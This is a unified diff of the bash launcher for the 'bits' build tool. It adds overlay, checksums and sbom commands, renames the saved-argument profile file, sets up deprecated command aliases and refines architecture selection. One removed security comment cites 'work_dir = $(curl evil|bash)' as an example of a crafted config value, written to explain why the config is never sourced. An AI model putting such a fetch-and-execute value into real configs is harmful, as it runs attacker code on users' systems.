@@ -5,12 +5,13 @@
 
 BITSDIR="$(dirname "$0")"
 
-# `.bitscmd` saved-arg profile (see `bits use`): inject the [common] + [<action>]
+# `.bitsuse` saved-arg profile (see `bits use`): inject the [common] + [<action>]
 # tokens right after the action, BEFORE anything is parsed, so both the build
 # path and the module commands (q/enter/…, which read ARGV below) see them.
-# Runs python only when a profile exists; `use` opts out; explicit args stay last
-# (they win on single-value options). Safe no-op if the action isn't first.
-if [[ -f .bitscmd ]]; then
+# The profile is a local ./.bitsuse (or legacy ./.bitscmd) or a per-directory
+# record under ~/.bits/use; the guard fires for any of them and python resolves
+# which applies (a no-op when none does). `use` opts out; explicit args stay last.
+if [[ -f .bitsuse || -f .bitscmd || -d "$HOME/.bits/use" ]]; then
   _bits_prof=()
   while IFS= read -r -d '' _bits_t; do _bits_prof+=("$_bits_t"); done \
     < <(BITS_SELF="${BITSDIR}" python3 -c 'import os,sys; sys.path.insert(0, os.environ.get("BITS_SELF","")); from bits_helpers.bits_use import main; sys.exit(main())' --rewrite0 -- "$@")
@@ -20,13 +21,28 @@ fi
 
 ARGV=("$@"); ARGC=$#   # ARGC must be a plain integer, not an array
 
-# `bits preload …` MUST be handled before the global `--config` pre-parse below,
-# which would otherwise swallow preload's own `--config <yaml>` (a name clash with
-# the bits.rc `--config`). Post-publish CVMFS filebundle generator: traces the
+# `bits preload …` is handled up-front (before module/dispatch setup) so its own
+# `--config <yaml>` is not consumed by later processing. Post-publish CVMFS
+# filebundle generator: traces the
 # deployed tests (strace, optionally --docker) and writes .cvmfsbundle-* into one
 # tar. Self-contained; needs no work dir. Uses the raw ARGV, unmangled.
 if [[ "${ARGV[0]:-}" == "preload" ]]; then
   BITS_SELF="${BITSDIR}" exec python3 -c 'import os,sys; sys.path.insert(0, os.environ.get("BITS_SELF","")); from bits_helpers.preload_cmd import main; sys.exit(main())' "${ARGV[@]:1}"
+fi
+
+# `bits overlay <format> …` — emit a consumable overlay of the built closure in a
+# named format (bits_helpers/overlay/<format>.py, or dropped in via
+# $BITS_OVERLAY_PLUGINS). Self-contained like preload; dispatched before the
+# build/defaults arg setup. Generic verb — nothing CERN-specific in the core CLI.
+if [[ "${ARGV[0]:-}" == "overlay" ]]; then
+  BITS_SELF="${BITSDIR}" exec python3 -c 'import os,sys; sys.path.insert(0, os.environ.get("BITS_SELF","")); from bits_helpers.overlay import main; sys.exit(main())' "${ARGV[@]:1}"
+fi
+
+# `bits lcg-view …` — DEPRECATED alias for `bits overlay lcg` (same arguments).
+# Kept so any straggler still calling it works; new recipes use `bits overlay lcg`.
+if [[ "${ARGV[0]:-}" == "lcg-view" ]]; then
+  echo "bits: 'lcg-view' is deprecated; use 'bits overlay lcg'." >&2
+  BITS_SELF="${BITSDIR}" exec python3 -c 'import os,sys; sys.path.insert(0, os.environ.get("BITS_SELF","")); from bits_helpers.overlay.lcg import main; sys.exit(main())' "${ARGV[@]:1}"
 fi
 
 # Optional phase timing for diagnosing slow load/enter: set BITS_TIMING=1 to
@@ -100,14 +116,16 @@ Usage: $0 \\
         ${ET}eval "\`bits shell-helper\`"${EZ}
 
     ${EM}build${EZ}   Build a package. Use ${ET}bits build --help${EZ} for details.
+    ${EM}checksums${EZ} Compute/record a recipe repository's checksums. Use ${ET}bits checksums --help${EZ} for details.
     ${EM}clean${EZ}   Clean build artifacts. Use ${ET}bits clean --help${EZ} for details.
     ${EM}cleanup${EZ} Evict stale packages from a persistent workDir. Use ${ET}bits cleanup --help${EZ} for details.
     ${EM}compliance${EZ} Audit licence metadata and the store. Use ${ET}bits compliance --help${EZ} for details.
     ${EM}deps${EZ}    Show dependency tree. Use ${ET}bits deps --help${EZ} for details.
     ${EM}doctor${EZ}  Verify build environment. Use ${ET}bits doctor --help${EZ} for details.
     ${EM}init${EZ}    Initialise a local package. Use ${ET}bits init --help${EZ} for details.
+    ${EM}sbom${EZ}    Export a build manifest as a CycloneDX/SPDX SBOM. Use ${ET}bits sbom --help${EZ} for details.
     ${EM}store${EZ}   Inspect/verify/clean the S3 content store. Use ${ET}bits store --help${EZ} for details.
-    ${EM}version${EZ} Display bits version.
+    ${EM}version${EZ} Display bits version: tag, commit and date (also ${ET}bits --version${EZ}).
 
 EoF
 [[ -z "$1" ]] || printf "${ER}ERROR: $*${EZ}\n" >&2
@@ -292,101 +310,33 @@ function _bt_mark() {
   _BT_PREV="$now"
 }
 
-function readBitsRc() {
-  # SECURITY: never source the config file (a crafted value like
-  # work_dir = $(curl evil|bash) would execute). The launcher itself needs only
-  # the work directory for module operations; every other bits.rc setting
-  # (config_dir, architecture, defaults, organisation, providers, ...) is read
-  # by the Python layer in bits_helpers/args.py. Extract work_dir with awk —
-  # flat "work_dir = value" or a value inside a leading [bits] section both
-  # work; sw_dir is accepted as a deprecated alias.
-  local cfgfile="$1"
-  [[ -f "$cfgfile" ]] || return 0
-  work_dir="$(awk '
-    { line=$0; sub(/^[[:space:]]*/,"",line); sub(/[[:space:]]*$/,"",line)
-      if (line ~ /^(work_dir|sw_dir)[[:space:]]*=/) {
-        sub(/^(work_dir|sw_dir)[[:space:]]*=[[:space:]]*/,"",line)
-        print line; exit } }' "$cfgfile")"
-  return 0
-}
-
-function checkLegacyBitsRc() {
-  # The bits.rc format was simplified. Reject old-style files loudly rather
-  # than silently ignoring renamed/removed keys. Old markers: the deprecated
-  # keys below, or any section other than [bits].
-  local cfgfile="$1"
-  [[ -f "$cfgfile" ]] || return 0
-  local bad
-  bad="$(awk '
-    /^[[:space:]]*\[/ {
-      if ($0 !~ /^[[:space:]]*\[bits\][[:space:]]*$/) { print "  section " $0 } ; next }
-    /^[[:space:]]*(repo_dir|sw_dir|pkg_prefix|branding)[[:space:]]*=/ {
-      k=$0; sub(/^[[:space:]]*/,"",k); sub(/[[:space:]]*=.*/,"",k); print "  key    " k }
-  ' "$cfgfile")"
-  [[ -z "$bad" ]] && return 0
-  {
-    echo "ERROR: $cfgfile uses the old bits.rc format. Offending entries:"
-    echo "$bad"
-    echo
-    echo "Please update it (a flat key = value file, or a single [bits] section):"
-    echo "  repo_dir     -> config_dir"
-    echo "  sw_dir       -> work_dir"
-    echo "  pkg_prefix   -> removed; the display prefix comes from the aliBuild wrapper (BITS_PKG_PREFIX)"
-    echo "  branding     -> removed"
-    echo "(search_path is still supported: it seeds BITS_PATH so recipes in a"
-    echo " sub-repo such as ./lcg.bits are found, e.g. for 'bits build ROOT'.)"
-    echo "Per-organisation [NAME] sections are no longer supported."
-    echo
-    echo "Example:"
-    echo "  organisation = stacks"
-    echo "  config_dir   = ."
-    echo "  search_path  = lcg"
-  } >&2
-  exit 1
-}
-
 function configBits() {
-  # Backward-compatibility default for the work directory. NOTE: the display
-  # prefix (BITS_PKG_PREFIX) and branding come from the ENVIRONMENT only — the
-  # aliBuild wrapper exports them for ALICE-style "VO_ALICE@pkg::ver" output;
-  # an empty BITS_PKG_PREFIX makes `bits q` print the native "<pkg>/<version>".
-  # organisation (registry/provider selection) and all other settings are
-  # handled by the Python layer, not here.
-  BITS_WORK_DIR=${BITS_WORK_DIR:-"sw"}
-
-  cfile=""
-  for cfg in "$1" bits.rc .bitsrc "$HOME/.bitsrc"
-  do
-    [[ -n "$cfg" && -f "$cfg" ]] && { cfile="$cfg"; break; }
-  done
-
-  local work_dir=
-  [[ -n "$cfile" ]] && checkLegacyBitsRc "$cfile"
-  [[ -n "$cfile" ]] && readBitsRc "$cfile"
-
-  export BITS_WORK_DIR=${work_dir:-$BITS_WORK_DIR}
+  # The work-directory default plus the display prefix (BITS_PKG_PREFIX) and
+  # branding come from the ENVIRONMENT only — the aliBuild wrapper exports them
+  # for ALICE-style "VO_ALICE@pkg::ver" output; an empty BITS_PKG_PREFIX makes
+  # `bits q` print the native "<pkg>/<version>". config_dir/architecture/
+  # providers/... are handled by the Python layer (-w overrides BITS_WORK_DIR).
+  export BITS_WORK_DIR=${BITS_WORK_DIR:-"sw"}
   export BITS_PKG_PREFIX=${BITS_PKG_PREFIX:-}
 }
 
-config_file=""
+configBits
 
-for ((i=0;i<$ARGC;i++)); do
-    arg=${ARGV[$i]}
-    opt=${arg%%=*}
-    val=${arg##*=}
-    case $opt in
-       --config)
-          config_file=$val
-       ;;
-       *)
-         new_args+=("$arg")
-         ;;
-   esac
-done
-
-configBits "$config_file"
-
-set -- "${new_args[@]}"
+# Deprecated command aliases (Phase 3.4): warn once and forward to the grouped
+# form. One arm per alias — retiring one is deleting its arm. Kept one release
+# for callers in sibling repos (see Phase 3.4 §7). Runs before the group arms
+# below so a rewritten command flows into the right one.
+case "${1:-}" in
+  cvmfs-stage)
+    echo "warning: 'bits cvmfs-stage' is deprecated; use 'bits cvmfs stage'" >&2
+    shift; set -- cvmfs stage "$@" ;;
+  cvmfs-publish)
+    echo "warning: 'bits cvmfs-publish' is deprecated; use 'bits cvmfs publish'" >&2
+    shift; set -- cvmfs publish "$@" ;;
+  store-stats)
+    echo "warning: 'bits store-stats' is deprecated; use 'bits store stats'" >&2
+    shift; set -- store stats "$@" ;;
+esac
 
 # `bits store …` → bitsStore (S3 content-store inspection, verification, cleanup).
 # Handled before work-dir/module setup: the store tool talks to S3, not the local
@@ -397,54 +347,34 @@ if [[ "${1:-}" == "store" ]]; then
   exec "$BITSDIR/bitsStore" "$@"
 fi
 
-# `bits use …` → save/show/clear a per-command arg profile in ./.bitscmd, so
-# repeated commands stay short (the injection at the top of this script consumes
-# it). Handled here, before work-dir/module setup: it only touches ./.bitscmd.
+# `bits use …` → save/show/clear a per-directory arg profile (./.bitsuse, or a
+# ~/.bits/use record when the cwd is not writeable), so repeated commands stay
+# short (the injection at the top of this script consumes it). Handled here,
+# before work-dir/module setup: it only touches the profile.
 if [[ "${1:-}" == "use" ]]; then
   shift
   BITS_SELF="${BITSDIR}" exec python3 -c 'import os,sys; sys.path.insert(0, os.environ.get("BITS_SELF","")); from bits_helpers.bits_use import main; sys.exit(main())' "$@"
 fi
 
-# `bits cvmfs {platforms,show,summary} …` → read-only inspection of a deployed
-# CVMFS bits tree: platforms + host compatibility, a package's build/provenance
-# from .meta.json (no jq), and a per-build_id summary. Reads the tree only, so it
-# needs no work dir; distinct from cvmfs-stage/cvmfs-publish (producer side).
+# `bits cvmfs {platforms,show,summary,stage,publish} …` → the CVMFS group.
+# platforms/show/summary read a deployed tree (no work dir); stage/publish are
+# the producer-side ops (ADR-0011), delegated inside cvmfs_inspect.main to their
+# own CLIs. Handled here, before work-dir/module setup: it talks to the tree /
+# S3, not the local install tree.
 if [[ "${1:-}" == "cvmfs" ]]; then
   shift
   BITS_SELF="${BITSDIR}" exec python3 -c 'import os,sys; sys.path.insert(0, os.environ.get("BITS_SELF","")); from bits_helpers.cvmfs_inspect import main; sys.exit(main())' "$@"
 fi
 
-# `bits cvmfs-stage …` → producer-side CVMFS staging (ADR-0011).
-# Prepares a package into a staging S3 prefix with the canonical publisher and
-# names the catalog prepub must graft. Handled here, before work-dir/module
-# setup, for the same reason as `store`: it talks to S3 and a tar, not to the
-# local install tree.
-#
-# Run like the view helper — source dir on sys.path via BITS_SELF, never
-# PYTHONPATH — so the helper's imports cannot leak into the caller's
-# environment. stdout is the two eval-able assignments and nothing else;
-# progress goes to stderr.
-if [[ "${1:-}" == "cvmfs-stage" ]]; then
-  shift
-  BITS_SELF="${BITSDIR}" exec python3 -c 'import os,sys; sys.path.insert(0, os.environ.get("BITS_SELF","")); from bits_helpers.cvmfs_stage_cmd import main; sys.exit(main())' "$@"
-fi
-
-# `bits cvmfs-publish …` → producer-side staged publish of a build's packages
-# (concurrent, biggest-first). Same source-on-sys.path convention as cvmfs-stage.
-if [[ "${1:-}" == "cvmfs-publish" ]]; then
-  shift
-  BITS_SELF="${BITSDIR}" exec python3 -c 'import os,sys; sys.path.insert(0, os.environ.get("BITS_SELF","")); from bits_helpers.cvmfs_publish import main; sys.exit(main())' "$@"
-fi
-
 for arg in "$@"
 do
   case $arg in
-    architecture|brew|build|certify|clean|cleanup|compliance|cvmfs-path|deps|doctor|gc|import|init|publish|stats|status|store-stats|verify|version|-debug|-d)
+    architecture|brew|build|certify|checksums|clean|cleanup|prune|compliance|cvmfs-path|deps|doctor|import|init|publish|sbom|sign|stats|status|verify|version|-debug|-d)
          mkdir -p "$BITS_WORK_DIR" || echo "Cannot create directory: $BITS_WORK_DIR"
         "$BITSDIR/bitsBuild" "$@"
 	    exit $?
         ;;
-    -n|--dry-run)
+    -n|--dry-run|--version)
         "$BITSDIR/bitsBuild" "$@"
 	    exit $?
         ;;
@@ -468,17 +398,6 @@ else
   EY=
   EZ=
 fi
-
-# If out of bits build directory, invoke bitsenv
-
-#if [ ! -f .bitsrc -a ! -f bits.rc ]
-#then
-#   bitsenv=`which bitsenv`
-#   if [ ! -z $bitsenv ]
-#   then
-#      exec $bitsenv $@
-#   fi
-#fi
 
 # My operating system
 
@@ -583,17 +502,38 @@ _ARCH_GIVEN=; [[ -n "$ARCHITECTURE" ]] && _ARCH_GIVEN=1
 # back to python only to disambiguate several installed arches (prefer the host's)
 # or when nothing is installed yet (e.g. a first build).
 if [[ -z "$_ARCH_GIVEN" ]]; then
+  # A real arch dir carries a CPU token (x86-64/aarch64/arm64/ppc64...). The
+  # reuse-from-modules overlays live under MODULES/<build_id>/<arch>, so MODULES/
+  # can also hold <build_id> dirs with no CPU token — exclude those so an overlay
+  # is never mistaken for an architecture.
   _present=()
   for _a in $(ls -1t "$WORK_DIR/MODULES" 2> /dev/null); do
-    [[ -d "$WORK_DIR/MODULES/$_a" ]] && _present+=("$_a")
+    [[ -d "$WORK_DIR/MODULES/$_a" ]] || continue
+    [[ "$_a" =~ (x86[-_]64|aarch64|arm64|ppc64le|ppc64) ]] || continue
+    _present+=("$_a")
   done
   if [[ ${#_present[@]} -eq 1 ]]; then
     ARCHITECTURE="${_present[0]}"            # sole installed arch — no python spawn
   elif [[ ${#_present[@]} -gt 1 ]]; then
-    # Several present: prefer the host's native arch if installed, else newest.
+    # Several present: prefer the host's native arch if installed.
     _host="$("bitsBuild" architecture 2> /dev/null || "$BITSDIR/bitsBuild" architecture 2> /dev/null || true)"
     ARCHITECTURE=
-    for _a in "${_present[@]}"; do [[ "$_a" == "$_host" ]] && { ARCHITECTURE="$_a"; break; }; done
+    if [[ -n "$_host" ]]; then
+      for _a in "${_present[@]}"; do [[ "$_a" == "$_host" ]] && { ARCHITECTURE="$_a"; break; }; done
+    fi
+    # No host match (or the host-arch probe momentarily failed → empty $_host):
+    # do not blindly pick the newest tree — prefer an arch whose module tree
+    # actually holds the requested package, so a failed probe cannot send
+    # q/enter/load to a tree that lacks the module.
+    if [[ -z "$ARCHITECTURE" ]]; then
+      _want=
+      for _m in "${ARGS[@]}"; do [[ "$_m" == -* ]] && continue; _want="${_m%%/*}"; break; done
+      if [[ -n "$_want" ]]; then
+        for _a in "${_present[@]}"; do
+          [[ -d "$WORK_DIR/MODULES/$_a/$_want" ]] && { ARCHITECTURE="$_a"; break; }
+        done
+      fi
+    fi
     if [[ -z "$ARCHITECTURE" ]]; then
       ARCHITECTURE="${_present[0]}"          # ls -1t → most recently built
       printf "${EY}NOTE: several architectures present; selected most recent: %s${EZ}\n" "$ARCHITECTURE" >&2
@@ -684,6 +624,14 @@ case "$ACTION" in
     _bt_mark modulecmd
     [[ $UNAME == Darwin ]] && eval $(stripDyld)
     detectShell
+    # A `view: true` package advertises BITS_VIEW in its modulefile; entering it
+    # auto-enables --view (collapse PATH/LD_LIBRARY_PATH onto the merged view). Any
+    # loaded module with the marker triggers it — fine while view packages are
+    # top-level (lcg-view requires the metapackage, nothing requires lcg-view).
+    # Consume-and-clear so the marker never leaks into the entered shell / a nested
+    # `bits setenv` (applyView keys off VIEWOPT, not BITS_VIEW).
+    [[ -n "${BITS_VIEW:-}" ]] && VIEWOPT=1
+    unset BITS_VIEW
     applyView
     if [[ ! -z "$CLEAN_ENV" ]]; then
       case $MODULES_SHELL in
@@ -741,6 +689,8 @@ case "$ACTION" in
     existModules $MODULES
     eval $($MODULECMD bash add $MODULES 2> >(grep -v "$IGNORE_ERR" >&2))
     [[ $UNAME == Darwin ]] && eval $(stripDyld)
+    [[ -n "${BITS_VIEW:-}" ]] && VIEWOPT=1   # view: true package auto-enables --view
+    unset BITS_VIEW                          # consume-and-clear (no leak into -c command)
     applyView
     exec "${COMMAND_IN_ENV[@]}"
   ;;
